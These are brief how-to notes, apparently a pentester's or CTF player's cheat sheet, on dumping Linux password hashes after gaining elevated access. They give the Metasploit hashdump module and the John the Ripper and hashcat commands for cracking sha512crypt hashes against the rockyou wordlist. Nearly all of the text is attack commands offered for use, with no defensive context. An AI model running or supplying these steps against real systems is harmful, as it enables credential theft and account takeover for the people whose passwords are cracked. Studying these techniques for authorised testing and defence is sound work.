After gaining elevated access, we can do this to dump hashes and crack passwords
With Metasploit, use this module
-use post/linux/gather/hashdump
 once you have the hashes in a text file, we will use john to crack them

 -john --format=sha512crypt <path_to_file> --wordlist=/usr/share/wordlists/rockyou.txt

 If you want to use hashcat, here is how
 -hashcat -a3 -m 1800 <path_to_file>  <wordlist(you can use rockyou from above or whatever you feel like trying>
